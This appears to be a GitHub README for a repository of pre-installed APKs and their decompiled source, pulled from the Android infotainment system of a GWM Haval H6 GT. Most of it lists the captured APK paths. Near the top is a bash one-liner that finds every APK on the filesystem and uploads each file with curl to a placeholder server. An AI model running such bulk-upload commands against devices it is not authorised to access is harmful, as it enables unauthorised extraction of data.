# gwm-haval-h6-gt-multimidia-native-apks 👀


Accessing the Haval H6 GT vehicle's operating system from GWM, I found the following APKs pre-installed:


This will be useful for security researchers to update their tools and for professional engineers to debug GWM's code.

```bash
for f in $(find / -type f -name "*.apk"); do curl -F "file=@$f" http://yourserver.com:5000/upload; done
```

You can view the APKs inside this repository in the /apks folder.

In the /src folder, you will find the decompiled source code of the APKs, obtained through online decompilers and JD-GUI. I would appreciate it if you could submit a pull request with any important or useful contributions.

List of Captured Files

```bash
/system/framework/framework-res.apk
/system/priv-app/TeleService/TeleService.apk
/system/priv-app/BeanSettings-app-Release/BeanSettings-app-Release.apk
/system/priv-app/OperatorCenterService-app-BUX1_B01/OperatorCenterService-app-BUX1_B01.apk
/system/priv-app/BeanGuidance-app-BUX1_B01/BeanGuidance-app-BUX1_B01.apk
/system/priv-app/CtsShimPrivPrebuilt/CtsShimPrivPrebuilt.apk
/system/priv-app/DownloadProvider/DownloadProvider.apk
/system/priv-app/BeanMediaCenter-expand_h51xos-core-bux1xos/BeanMediaCenter-expand_h51xos-core-bux1xos.apk
/system/priv-app/BeanSceneEngineService-app-BUX10_B01/BeanSceneEngineService-app-BUX10_B01.apk
/system/priv-app/BeanEnergyAssistant-app-Release/BeanEnergyAssistant-app-Release.apk
/system/priv-app/BlockedNumberProvider/BlockedNumberProvider.apk
/system/priv-app/BackupRestoreConfirmation/BackupRestoreConfirmation.apk
/system/priv-app/VpnDialogs/VpnDialogs.apk
/system/priv-app/BeanDrivingAnalysisService-app-Release/BeanDrivingAnalysisService-app-Release.apk
/system/priv-app/Launcher-app-Release/Launcher-app-Release.apk
/system/priv-app/ContactsProvider/ContactsProvider.apk
/system/priv-app/ProxyHandler/ProxyHandler.apk
/system/priv-app/CallLogBackup/CallLogBackup.apk
/system/priv-app/TsScreenRecorderService/TsScreenRecorderService.apk
/system/priv-app/Shell/Shell.apk
/system/priv-app/CarMediaApp/CarMediaApp.apk
/system/priv-app/BeanVehicleCenter-app-Release/BeanVehicleCenter-app-Release.apk
/system/priv-app/AccountService-app-Release/AccountService-app-Release.apk
/system/priv-app/Provision/Provision.apk
/system/priv-app/BeanMultiDisplay-app-Release/BeanMultiDisplay-app-Release.apk
/system/priv-app/InputDevices/InputDevices.apk
/system/priv-app/VoicePrintService-app/VoicePrintService-app.apk
/system/priv-app/BtPhone-app-bux100GwB01/BtPhone-app-bux100GwB01.apk
/system/priv-app/DataTrackService-app-Release/DataTrackService-app-Release.apk
/system/priv-app/ManagedProvisioning/ManagedProvisioning.apk
/system/priv-app/OperatorCenter-app-Release/OperatorCenter-app-Release.apk
/system/priv-app/MediaProvider/MediaProvider.apk
/system/priv-app/MmsService/MmsService.apk
/system/priv-app/StorageManager/StorageManager.apk
/system/priv-app/CarService/CarService.apk
/system/priv-app/StatementService/StatementService.apk
/system/priv-app/DefaultContainerService/DefaultContainerService.apk
/system/priv-app/SystemUI-app-BUX10_B01/SystemUI-app-BUX10_B01.apk
/system/priv-app/VRAdapt-app-asean/VRAdapt-app-asean.apk
/system/priv-app/BeanExploreService-app-Release/BeanExploreService-app-Release.apk
/system/priv-app/SharedStorageBackup/SharedStorageBackup.apk
/system/priv-app/VRClient-app-Release/VRClient-app-Release.apk
/system/priv-app/CalendarProvider/CalendarProvider.apk
/system/priv-app/SettingsIntelligence/SettingsIntelligence.apk
/system/priv-app/ExternalStorageProvider/ExternalStorageProvider.apk
/system/priv-app/FusedLocation/FusedLocation.apk
/system/priv-app/BeanHVAC-app-Release/BeanHVAC-app-Release.apk
/system/priv-app/LocalMediaPlayer/LocalMediaPlayer.apk
/system/priv-app/UserDictionaryProvider/UserDictionaryProvider.apk
/system/priv-app/MtpDocumentsProvider/MtpDocumentsProvider.apk
/system/priv-app/CarPackageInstaller/CarPackageInstaller.apk
/system/priv-app/BeanNetTrafficService-app/BeanNetTrafficService-app.apk
/system/priv-app/BeanMediaCenter-app-bux1xos/BeanMediaCenter-app-bux1xos.apk
/system/priv-app/Settings/Settings.apk
/system/priv-app/DownloadProviderUi/DownloadProviderUi.apk
/system/priv-app/ExtServices/ExtServices.apk
/system/priv-app/SettingsProvider/SettingsProvider.apk
/system/priv-app/BeanInputService-app-Release/BeanInputService-app-Release.apk
/system/priv-app/BeanExtProvider-app/BeanExtProvider-app.apk
/system/priv-app/BeanPersonalization-app-Release/BeanPersonalization-app-Release.apk
/system/priv-app/Telecom/Telecom.apk
/system/priv-app/CarRadioApp/CarRadioApp.apk
/system/priv-app/CarSettings/CarSettings.apk
/system/priv-app/TelephonyProvider/TelephonyProvider.apk
/system/priv-app/BeanMediaCenter-expand_h51xos-ui-bux1xos/BeanMediaCenter-expand_h51xos-ui-bux1xos.apk
/system/priv-app/EmbeddedKitchenSinkApp/EmbeddedKitchenSinkApp.apk
/system/priv-app/BeanIntelligentVehicleControl-app/BeanIntelligentVehicleControl-app.apk
/system/priv-app/AppList-app-Release/AppList-app-Release.apk
/system/BeantechSkin/P05-CY-THA_13/BeanHVACSkinResource-P05-CY-THA_13.apk
/system/BeantechSkin/P05-CY-THA_13/AppListSkinResource-P05-CY-THA_13.apk
/system/BeantechSkin/P05-CY-THA_13/LauncherSkinResource-P05-CY-THA_13.apk
/system/BeantechSkin/P05-CY-THA_13/BeanSettingsSkinResource-P05-CY-THA_13.apk
/system/BeantechSkin/B01G-1_17/BeanHVACSkinResource-B01G-1_17.apk
/system/BeantechSkin/B01G-1_17/MediacenterSkinResouce-B01G-1_17.apk
/system/BeantechSkin/B01G-1_17/LauncherSkinResource-B01G-1_17.apk
/system/BeantechSkin/B01G-1_17/AppListSkinResource-B01G-1_17.apk
/system/BeantechSkin/B01G-1_17/SystemUISkinResource-B01G-1_17.apk
/system/BeantechSkin/B01G-1_17/BeanMapSkinResource-B01G-1_17.apk
/system/BeantechSkin/B01G-1_17/BeanSettingsSkinResource-B01G-1_17.apk
/system/BeantechSkin/B01G-THA_13/BeanMapSkinResource-B01G-THA_13.apk
/system/BeantechSkin/B01G-THA_13/BeanHVACSkinResource-B01G-THA_13.apk
/system/BeantechSkin/B01G-THA_13/AppListSkinResource-B01G-THA_13.apk
/system/BeantechSkin/B01G-THA_13/MediacenterSkinResouce-B01G-THA_13.apk
/system/BeantechSkin/ES11G-3_7/SystemUISkinResource-ES11G-3_7.apk
/system/BeantechSkin/ES11G-3_7/BeanSettingsSkinResource-ES11G-3_7.apk
/system/BeantechSkin/ES11G-3_7/BeanHVACSkinResource-ES11G-3_7.apk
/system/BeantechSkin/ES11G-3_7/BeanMapSkinResource-ES11G-3_7.apk
/system/BeantechSkin/ES11G-3_7/MediacenterSkinResouce-ES11G-3_7.apk
/system/BeantechSkin/ES11G-3_7/AppListSkinResource-ES11G-3_7.apk
/system/BeantechSkin/ES11G-3_7/LauncherSkinResource-ES11G-3_7.apk
/system/BeantechSkin/P05-YY-THA_13/BeanHVACSkinResource-P05-YY-THA_13.apk
/system/BeantechSkin/P05-YY-THA_13/AppListSkinResource-P05-YY-THA_13.apk
/system/BeantechSkin/P05-YY-THA_13/LauncherSkinResource-P05-YY-THA_13.apk
/system/BeantechSkin/P05-YY-THA_13/BeanSettingsSkinResource-P05-YY-THA_13.apk
/system/BeantechSkin/B03G_17/AppListSkinResource-B03G_17.apk
/system/BeantechSkin/B03G_17/BeanHVACSkinResource-B03G_17.apk
/system/BeantechSkin/B03G_17/MediacenterSkinResouce-B03G_17.apk
/system/BeantechSkin/B03G_17/LauncherSkinResource-B03G_17.apk
/system/BeantechSkin/B03G_17/BeanSettingsSkinResource-B03G_17.apk
/system/BeantechSkin/B03G_17/SystemUISkinResource-B03G_17.apk
/system/BeantechSkin/B03G_17/BeanMapSkinResource-B03G_17.apk
/system/app/lcm_time_tracker/lcm_time_tracker.apk
/system/app/SpeechHMI-release/SpeechHMI-release.apk
/system/app/CarAudioExtService/CarAudioExtService.apk
/system/app/GreatWallNav-0.03.02.06.22.51.2a.15-release/GreatWallNav-0.03.02.06.22.51.2a.15-release.apk
/system/app/PowerExtensionService/PowerExtensionService.apk
/system/app/CompanionDeviceManager/CompanionDeviceManager.apk
/system/app/FotaService-fotaService-BUX10_B01/FotaService-fotaService-BUX10_B01.apk
/system/app/ExtShared/ExtShared.apk
/system/app/TboxService/TboxService.apk
/system/app/TsCarPlayApp/TsCarPlayApp.apk
/system/app/BeanDeviceListServer-app-Release/BeanDeviceListServer-app-Release.apk
/system/app/Installer/Installer.apk
/system/app/FotaUI-app-BUX10_B01/FotaUI-app-BUX10_B01.apk
/system/app/CarPermissionService/CarPermissionService.apk
/system/app/ExternalKeyService/ExternalKeyService.apk
/system/app/CarLatinIME/CarLatinIME.apk
/system/app/managerservice_v1.0.18_b01/managerservice_v1.0.18_b01.apk
/system/app/CarrierDefaultApp/CarrierDefaultApp.apk
/system/app/PowerController/PowerController.apk
/system/app/Bluetooth/Bluetooth.apk
/system/app/BeanAdapterTool-BeanAdapterClientTool-Release/BeanAdapterTool-BeanAdapterClientTool-Release.apk
/system/app/CtsShimPrebuilt/CtsShimPrebuilt.apk
/system/app/KeyChain/KeyChain.apk
/system/app/webview/webview.apk
/system/app/WAPPushManager/WAPPushManager.apk
/system/app/ClusterService/ClusterService.apk
/system/app/CarMapsPlaceholder/CarMapsPlaceholder.apk
/system/app/BeanSSClient-app-Release/BeanSSClient-app-Release.apk
/system/app/PrintSpooler/PrintSpooler.apk
/system/app/EnginMode/EnginMode.apk
/system/app/BeanAdapterService/BeanAdapterService.apk
/system/app/ime-3.0-beantech-20221215/ime-3.0-beantech-20221215.apk
/system/app/CarLensPickerApp/CarLensPickerApp.apk
/system/app/BeanAccessibility-app-buxOverseas/BeanAccessibility-app-buxOverseas.apk
/system/app/magic_iperf/magic_iperf.apk
/system/app/PrintRecommendationService/PrintRecommendationService.apk
/system/app/Account-app-Release/Account-app-Release.apk
/system/app/BluetoothMidiService/BluetoothMidiService.apk
/system/app/diagService/diagService.apk
/system/app/WallpaperBackup/WallpaperBackup.apk
/system/app/MiscFdService/MiscFdService.apk
/system/app/Traceur/Traceur.apk
/system/app/ime-3.0-beantech-20221013/ime-3.0-beantech-20221013.apk
/system/app/PacProcessor/PacProcessor.apk
/system/app/BeanWeatherService-app-Release/BeanWeatherService-app-Release.apk
/system/app/BeanMaintenance-app-Release/BeanMaintenance-app-Release.apk
/system/app/SecureElement/SecureElement.apk
/system/app/CaptivePortalLogin/CaptivePortalLogin.apk
/system/app/CoreSystemServer/CoreSystemServer.apk
/system/app/PersonalCenter-app-Release/PersonalCenter-app-Release.apk
/system/app/CertInstaller/CertInstaller.apk
/system/app/BeanLogMgrService-app-Release/BeanLogMgrService-app-Release.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-voice-oversea_voice-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-map-greatwall_map-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-common-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-multidisplay-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-mixture-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-weather-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-multimedia-oversea_mediacenter-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-account-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-component-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-adapter-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-input-release-unsigned.apk
/data/data/com.beantechs.sceneengineservice/files/plugin/internal/plugin-call-oversea-release-unsigned.apk
/vendor/overlay/SysuiDarkTheme/SysuiDarkThemeOverlay.apk
/vendor/app/TsWifiService/TsWifiService.apk
/vendor/app/TsBluetoothService/TsBluetoothService.apk
/vendor/app/BeanPKIMaintain-app-Release/BeanPKIMaintain-app-Release.apk
/vendor/app/TsCarPlayService/TsCarPlayService.apk
/vendor/app/AndroidAutoApp/AndroidAutoApp.apk
/vendor/app/SomeIpService/SomeIpService.apk
/vendor/app/DeviceConnectionManagementService/DeviceConnectionManagementService.apk
/vendor/app/AndroidAutoService/AndroidAutoService.apk
/vendor/app/BeanPKIFactory-app-Release/BeanPKIFactory-app-Release.apk
/vendor/app/UdsService/UdsService.apk
```




Thank you.
